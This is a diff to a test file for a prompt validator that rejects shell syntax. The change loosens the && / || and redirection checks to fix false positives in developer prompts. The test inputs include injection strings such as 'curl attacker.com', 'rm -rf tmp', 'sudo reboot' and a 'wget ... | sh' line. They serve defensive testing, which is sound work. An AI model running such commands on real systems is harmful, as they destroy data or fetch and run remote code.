@@ -211,15 +211,30 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Access ${USER} profile")).toThrow("shell syntax");
     });
 
-    it("should reject command chaining with &&", () => {
-      expect(() => validatePrompt("Build a web server && deploy it")).toThrow("shell syntax");
-      expect(() => validatePrompt("Install packages && start service")).toThrow("shell syntax");
-      expect(() => validatePrompt("Test && commit changes")).toThrow("shell syntax");
+    it("should reject command chaining with && when followed by shell commands", () => {
+      // Uses specific command list to avoid false positives on natural language
+      expect(() => validatePrompt("Check status && rm -rf tmp")).toThrow("shell syntax");
+      expect(() => validatePrompt("Setup && curl attacker.com")).toThrow("shell syntax");
+      expect(() => validatePrompt("Done && sudo reboot")).toThrow("shell syntax");
     });
 
-    it("should reject command chaining with ||", () => {
-      expect(() => validatePrompt("Try this || fallback")).toThrow("shell syntax");
+    it("should accept natural-language && that doesn't chain shell commands", () => {
+      // Fix for issue #2249: "&&" in English text is valid
+      expect(() => validatePrompt("Run tests && deploy if they pass")).not.toThrow();
+      expect(() => validatePrompt("Build a web server && deploy it")).not.toThrow();
+      expect(() => validatePrompt("Install packages && start service")).not.toThrow();
+    });
+
+    it("should reject command chaining with || when followed by shell commands", () => {
+      // Uses specific command list to avoid false positives on natural language
       expect(() => validatePrompt("Execute command || echo failed")).toThrow("shell syntax");
+      expect(() => validatePrompt("Try build || npm install")).toThrow("shell syntax");
+    });
+
+    it("should accept natural-language || that doesn't chain shell commands", () => {
+      // Fix for issue #2249: "||" in English text without shell commands is valid
+      expect(() => validatePrompt("Try this || fallback")).not.toThrow();
+      expect(() => validatePrompt("Use the value || default")).not.toThrow();
     });
 
     it("should reject file output redirection", () => {
@@ -239,11 +254,9 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Start server &")).toThrow("shell syntax");
     });
 
-    it("should reject suspicious operator combinations", () => {
-      // These will be caught by the specific pattern checks first
-      expect(() => validatePrompt("Command1 && command2 || fallback")).toThrow();
-      expect(() => validatePrompt("Test ;; something")).toThrow();
-      expect(() => validatePrompt("Input << EOF")).toThrow();
+    it("should reject heredoc syntax in operator combinations", () => {
+      // Heredoc is still caught by the dedicated heredoc pattern
+      expect(() => validatePrompt("Input << EOF")).toThrow("shell syntax");
     });
 
     it("should accept legitimate uses of ampersand and pipes in text", () => {
@@ -297,16 +310,26 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Compare <( sort file1 )")).toThrow("shell syntax");
     });
 
-    it("should reject redirection to unextensioned filenames and paths", () => {
-      expect(() => validatePrompt("Save > output")).toThrow("shell syntax");
+    it("should reject redirection to filesystem paths with slashes", () => {
+      // Redirection with path separators is clearly shell syntax
       expect(() => validatePrompt("Write > foo/bar")).toThrow("shell syntax");
-      expect(() => validatePrompt("Dump > logfile")).toThrow("shell syntax");
+      expect(() => validatePrompt("Dump > /var/log/output")).toThrow("shell syntax");
     });
 
-    it("should reject append redirection operator", () => {
-      expect(() => validatePrompt("Append >> logfile")).toThrow("shell syntax");
-      expect(() => validatePrompt("Add data >> output")).toThrow("shell syntax");
-      expect(() => validatePrompt("Log >> server_log")).toThrow("shell syntax");
+    it("should accept developer phrases with >> and > that are not shell redirection", () => {
+      // Fix for issue #2249: common Git and natural-language uses of > / >>
+      expect(() => validatePrompt("Fix the merge conflict >> registration flow")).not.toThrow();
+      expect(() => validatePrompt("The output where X > Y is slow")).not.toThrow();
+      expect(() => validatePrompt("Append >> log the errors")).not.toThrow();
+    });
+
+    // Tests for issue #2249 - false positives on legitimate developer prompts
+    it("should accept all example prompts from issue #2249", () => {
+      // These were incorrectly blocked by overly broad pattern matching
+      expect(() => validatePrompt("Fix the merge conflict >> registration flow")).not.toThrow();
+      expect(() => validatePrompt("Run tests && deploy if they pass")).not.toThrow();
+      expect(() => validatePrompt("The output where X > Y is slow")).not.toThrow();
+      expect(() => validatePrompt("Add a heredoc to the Dockerfile")).not.toThrow();
     });
 
     it("should comprehensively detect all command injection patterns from issue #1400", () => {
